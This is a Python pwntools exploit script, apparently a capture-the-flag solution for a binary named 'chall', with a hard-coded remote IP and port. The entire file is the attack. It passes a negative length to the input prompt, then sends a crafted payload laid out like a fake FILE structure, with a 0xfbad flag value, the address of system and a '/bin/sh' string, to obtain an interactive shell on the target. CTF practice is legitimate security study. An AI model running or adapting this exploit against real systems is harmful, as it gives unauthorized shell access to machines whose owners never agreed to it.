#!/usr/bin/env python3
from pwn import *

PORT = 8996
HOST = "15.235.202.47"
elf = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*0000000000401467
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

system = elf.plt.system
box = 0x404040

p.sendlineafter(b"your buffer: ", str(-80).encode())

pl = flat({
        0x00: system,
        0x60: b"/bin/sh\0",  # a1[0]
        0x70: 0xfbad0000,    # a1[2] & 0xFFFF0000LL = 0xFBAD0000LL
        0x80: 2,             # a1[4] > a1[5]
        0x88: 1,             
        0xa8: box            # a1[9]
    }, filler = b'\x00')

pl = pl.ljust(0xb0)

p.send(pl)

p.interactive()